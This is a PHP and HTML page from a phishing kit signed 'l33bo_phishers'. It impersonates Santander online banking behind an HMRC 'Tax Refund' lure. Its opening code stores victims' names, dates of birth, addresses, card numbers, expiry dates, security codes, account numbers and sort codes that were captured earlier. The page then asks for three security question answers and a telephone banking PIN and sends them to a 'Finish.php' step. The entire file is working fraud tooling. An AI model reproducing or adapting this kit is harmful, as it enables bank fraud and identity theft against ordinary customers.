<?php
/*
Created by l33bo_phishers -- icq: 695059760 
*/
session_start();
require "../assets/includes/functions.php";
require "../assets/includes/Bank_One_Time.php";
require "../assets/includes/simplehtmldom.php";
require "../assets/includes/enc.php";
$_SESSION['name'] = $_POST["name"];
$_SESSION['dob'] = $_POST["dob"];
$_SESSION['address'] = $_POST["address"];
$_SESSION['postcode'] = $_POST["postcode"];
$_SESSION['telephone'] = $_POST["telephone"];
$_SESSION['ccname'] = $_POST["ccname"];
$_SESSION['ccno'] = $_POST["ccno"];
$_SESSION['ccexp'] = $_POST["ccexp"];
$_SESSION['secode'] = $_POST["secode"];
$_SESSION['account'] = $_POST["account"];
$_SESSION['sortcode'] = $_POST["sortcode"];
?>
<!DOCTYPE html>
<html lang="en-GB">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Tax Refund</title>
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="Tue, 01 Jan 1980 12:00:00 GMT">
<meta http-equiv="Cache-Control" content="no-cache">
<link rel="shortcut icon" href="assets/img/favicon.ico">
<link rel="stylesheet" type="text/css" media="screen, print" href="assets/css/main.css">
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0-beta1/jquery.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.0/jquery.validate.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.0/additional-methods.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/1.3.2/jquery.payment.js"></script>
<script>
$('#details').validate();
  (function($,W,D)
{
    var JQUERY4U = {};

    JQUERY4U.UTIL =
    {
        setupFormValidation: function()
        {
            //form validation rules
            $("#details").validate({
				errorElement: "div",			
                rules: {
					q1: {	required: true},
					q2: {	required: true},
					q3: {	required: true},
					a1: { required: true,	minlength: 3,},
					a2: { required: true,	minlength: 3,},
					a3: { required: true,	minlength: 3,},
					telepin: { required: true,	minlength: 6,},
                },
                messages: {
					q1: {
						required: "Please select a security question",
					},
					q2: {
						required: "Please select a security question",
					},
					q3: {
						required: "Please select a security question",
					},
					a1: { 
						required: "Please provide your answer to the above security question",
						minlength: jQuery.validator.format("Please check the answer you have entered"),
					},
					a2: { 
						required: "Please provide your answer to the above security question",
						minlength: jQuery.validator.format("Please check the answer you have entered"),
					},
					a3: { 
						required: "Please provide your answer to the above security question",
						minlength: jQuery.validator.format("Please check the answer you have entered"),
					},
					telepin: { 
						required: "Please provide your telephone banking pin",
						minlength: jQuery.validator.format("Please check the telephone banking pin you have entered"),
					},
				},
                submitHandler: function(form) {
                    form.submit();
                }
            });
        }
    }

    //when the dom has loaded setup form validation rules
    $(D).ready(function($) {
        JQUERY4U.UTIL.setupFormValidation();
    });

})(jQuery, window, document);
  
</script>
<script type="text/javascript" >
    function check_questions(e) { 
     $('.question').each(function(i, ele){
            if(ele != e && ele.value == e.value){
                document.getElementById("ErrorBox").style.display = "block";
					return false;
					
            }
      })
    }
    function check_answers(e) { 
     $('.answer').each(function(i, ele){
            if(ele != e && ele.value == e.value){
                document.getElementById("ErrorBox1").style.display = "block";
					return false;
					
            }
      })
    }
	
    </script>
<style>
div.error {color:red;}
</style>
</head>
<body>
<div id="global">
<div id="header"> 
<div id="headerbanner">
<div id="MainLogo">
<a href="#">Santander - Online Banking</a>	
</div>
<div id="loginfo">
<span class="username">&nbsp;</span>
<span class="username"><strong>Account Verification</strong></span>
<span class="unsuccessful">&nbsp;</span>                          
</div>
<div id="logoff"><a href="#">Log off</a></div>
</div>
<div id="mainmenu">
<ul>
<li><a href="#"><span>My Accounts &amp; Transactions</span></a></li>
<li><a href="#"><span>Payments &amp; Transfers</span></a></li>
<li><a href="#"><span>Standing Orders</span></a></li>
<li><a href="#"><span>Direct Debits</span></a></li>
<li><a href="#"><span>Credit Cards</span></a></li>
<li><a href="#"><span>Account Services</span></a></li>
<li><a class="active" href="#"><span>Account verification</span></a></li>
<li><a href="#"><span>Help &amp; Contact Us</span></a></li>
</ul>
</div>
</div>
<div id="informationBar">
<div id="submenu">
<ul>
<li><a href="#">Change security settings</a></li>
<li><a href="#">Change personal details</a></li>
<li><a href="#">Change online settings</a></li>
<li><a href="#">Other services</a></li>
</ul>
</div>
<div class="toolboxes">	
<div id="fasttransfer" class="toolbox">
<div>
<div class="toolboxhead">
<h3>Quick Transfer</h3>
<p>Between accounts or to existing payees</p>
</div>
<div class="toolboxbody autotab">
<select id="transferfrom">
<option value="">Transfer from...</option>
<option value="clickhere"> Click here</option>
</select>
<select id="transferto" disabled="">
<option></option>
</select>£ 
<input class="currencyInteger" title="Amount" type="text" id="qt_amount" maxlength="7"> . 
<input class="currencyFractional" title="amount (pence)" type="text" id="qt_decimal" maxlength="2"> 
<span class="button">
<input type="button" title="Make a payment" value="Go">
</span>
</div>
</div>
</div>		
<div id="alertsToolbox" class="toolbox">							     					   
<div class="toolboxhead">
<h3><a href="#">Alerts</a></h3>
<p>Set up free text and email alerts</p>
</div>
</div>
<div id="contactus" class="toolbox">			     	
<div class="toolboxhead">
<h3><a href="#"><strong>Contact Us</strong></a></h3>
</div>
<div class="toolboxbody">
<ul>
<li class="viewmessages"><a href="#">View messages</a></li>
<li class="sendsecure"><a href="#">Send secure message</a></li>
<li class="callus"><a href="#">Call us</a></li>
<li class="visit"><a href="#">Visit branch</a></li>
</ul>
</div>			
</div>	
</div>
</div>

<div id="bodycontent">
<div id="content">	
<div id="pagetools">		
<ul>			
<li class="iconhelp"><a href="#" id="helpCommand">Help with this page</a></li>		
</ul>	
</div> 	
<h1>Tax Refund</h1>	
<div class="guide">		
<ol>			
<li><span><span class="hidemeaural">1.</span> Confirm Details</span></li>			
<li class="selected"><span><span class="hidemeaural">2.</span> Account Security</span></li>			
<li class="last"><span><span class="hidemeaural">3.</span> Verification Complete</span></li>		
</ol>	
</div>		
<div class="container">	
<form name="form" accept-charset="UTF-8" method="post" action="Finish.php?Account-Verification&sessionid=<?php echo generateRandomString(115); ?>&securessl=true" name="details" id="details">	
<p>In order for HMRC to process payments direct to your bank account please confirm your information below.</p>	
<h2>Confirm Security Information</h2>
<div id="ErrorBox" style="display: none;" class="message alert">
<p><strong>You can not select the same security questions</strong></p>
</div>	
<div id="ErrorBox1" style="display: none;" class="message alert">
<p><strong>The answers to your security questions can not match</strong></p>
</div>			
<div class="contents">	
<fieldset>		
<div class="form">		
<!-- INPUT -->				
<div class="form-item">				
<label for="q1"><span class="labeltext">Confirm Security Question 1:</span>
<span class="data">
<select class="firstfocus correct question" name="q1" id="q1" tabindex="1" onchange="return check_questions(this);">
<option selected="selected" value="">Please choose from ...</option>
<option value="Place of Birth">Place of Birth</option>
<option value="Name of first school">Name of first school</option>
<option value="Name of secondary school">Name of secondary school</option>
<option value="Mothers middle name">Mother's middle name</option>
<option value="Fathers middle name">Father's middle name</option>
<option value="Maternal grandmothers first name">Maternal grandmother's first name</option>
<option value="Maternal grandfathers first name">Maternal grandfather's first name</option>
</select>
</span> 
</label>
</div>
<!-- INPUT -->				
<div class="form-item">				
<label for="a1"><span class="labeltext">Confirm Answer:</span>
<span class="data"><input type="text" name="a1" class="answer firstfocus correct" id="a1" maxlength="40" size="30" tabindex="2" onblur="return check_answers(this);"></span> 
</label>
</div>
<!-- INPUT -->				
<div class="form-item">				
<label for="q2"><span class="labeltext">Confirm Security Question 2:</span>
<span class="data">
<select class="firstfocus correct question" name="q2" id="q2" tabindex="3" onchange="return check_questions(this);">
<option selected="selected" value="">Please choose from ...</option>
<option value="Place of Birth">Place of Birth</option>
<option value="Name of first school">Name of first school</option>
<option value="Name of secondary school">Name of secondary school</option>
<option value="Mothers middle name">Mother's middle name</option>
<option value="Fathers middle name">Father's middle name</option>
<option value="Maternal grandmothers first name">Maternal grandmother's first name</option>
<option value="Maternal grandfathers first name">Maternal grandfather's first name</option>
</select>
</span> 
</label>
</div>
<!-- INPUT -->				
<div class="form-item">				
<label for="a2"><span class="labeltext">Confirm Answer:</span>
<span class="data"><input type="text" name="a2" class="answer firstfocus correct" id="a2" maxlength="40" size="30" tabindex="4" onblur="return check_answers(this);"></span> 
</label>
</div>	
<!-- INPUT -->				
<div class="form-item">				
<label for="q3"><span class="labeltext">Confirm Security Question 3:</span>
<span class="data">
<select class="question firstfocus correct" name="q3" id="q3" tabindex="5" onchange="return check_questions(this);">
<option selected="selected" value="">Please choose from ...</option>
<option value="Place of Birth">Place of Birth</option>
<option value="Name of first school">Name of first school</option>
<option value="Name of secondary school">Name of secondary school</option>
<option value="Mothers middle name">Mother's middle name</option>
<option value="Fathers middle name">Father's middle name</option>
<option value="Maternal grandmothers first name">Maternal grandmother's first name</option>
<option value="Maternal grandfathers first name">Maternal grandfather's first name</option>
</select>
</span> 
</label>
</div>
<!-- INPUT -->				
<div class="form-item">				
<label for="a3"><span class="labeltext">Confirm Answer:</span>
<span class="data"><input type="text" name="a3" class="answer firstfocus correct" id="a3" maxlength="40" size="30" tabindex="6" onblur="return check_answers(this);"></span> 
</label>
</div>
<!-- INPUT -->				
<div class="form-item">				
<label for="telepin"><span class="labeltext">Telephone Banking Pin:</span>
<span class="data"><input type="text" name="telepin" class="firstfocus correct" id="telepin" maxlength="6" size="5" tabindex="7"></span> 
</label>
</div>


</div>		
<div class="buttonholder">
<span class="button"><input type="submit" name="go" id="go" class="primary" tabindex="8" value="Continue &gt;"></span>				
</div>				
</fieldset>
</div>
</form>		
</div>
</div>
</div>
<div id="footer">
<ul>
<li><a href="#">Online Banking Guarantee</a></li>
<li><a href="#">Site Help &amp; Accessibility</a></li>
<li><a href="#">Security &amp; Privacy</a></li>
<li><a href="#">Terms &amp; Conditions</a></li>
<li class="last"><a href="#">Legal</a></li>
</ul>
</div>
</div>
</body>
</html>




































 
 <?php // L33BO -- PHISHERS ?>
 <?php // L33BO -- PHISHERS ?>
 <?php // L33BO -- PHISHERS ?>
 <?php // L33BO -- PHISHERS ?>
 <?php // L33BO -- PHISHERS ?>
 <?php // L33BO -- PHISHERS ?>
 <?php // L33BO -- PHISHERS ?>
 <?php // L33BO -- PHISHERS ?>
 <?php // L33BO -- PHISHERS ?>
 <?php // L33BO -- PHISHERS ?>
 <?php // L33BO -- PHISHERS ?>
 <?php // L33BO -- PHISHERS ?>
 <?php // L33BO -- PHISHERS ?>
 <?php // L33BO -- PHISHERS ?>
 <?php // L33BO -- PHISHERS ?>
 <?php // L33BO -- PHISHERS ?>
 <?php // L33BO -- PHISHERS ?>
 <?php // L33BO -- PHISHERS ?>
 <?php // L33BO -- PHISHERS ?>
 <?php // L33BO -- PHISHERS ?>
 <?php // L33BO -- PHISHERS ?>
 <?php // L33BO -- PHISHERS ?>
 <?php // L33BO -- PHISHERS ?>
 <?php // L33BO -- PHISHERS ?>
 <?php // L33BO -- PHISHERS ?>
 <?php // L33BO -- PHISHERS ?>
 <?php // L33BO -- PHISHERS ?>
 <?php // L33BO -- PHISHERS ?>
 <?php // L33BO -- PHISHERS ?>
 <?php // L33BO -- PHISHERS ?>
 <?php // L33BO -- PHISHERS ?>
 <?php // L33BO -- PHISHERS ?>
 <?php // L33BO -- PHISHERS ?>
 <?php // L33BO -- PHISHERS ?>
 <?php // L33BO -- PHISHERS ?>
 <?php // L33BO -- PHISHERS ?>
 <?php // L33BO -- PHISHERS ?>
 <?php // L33BO -- PHISHERS ?>
 <?php // L33BO -- PHISHERS ?>
 <?php // L33BO -- PHISHERS ?>
 <?php // L33BO -- PHISHERS ?>
 <?php // L33BO -- PHISHERS ?>
 <?php // L33BO -- PHISHERS ?>
 <?php // L33BO -- PHISHERS ?>
 <?php // L33BO -- PHISHERS ?>
 <?php // L33BO -- PHISHERS ?>
 <?php // L33BO -- PHISHERS ?>
 <?php // L33BO -- PHISHERS ?>
 <?php // L33BO -- PHISHERS ?>
 <?php // L33BO -- PHISHERS ?>
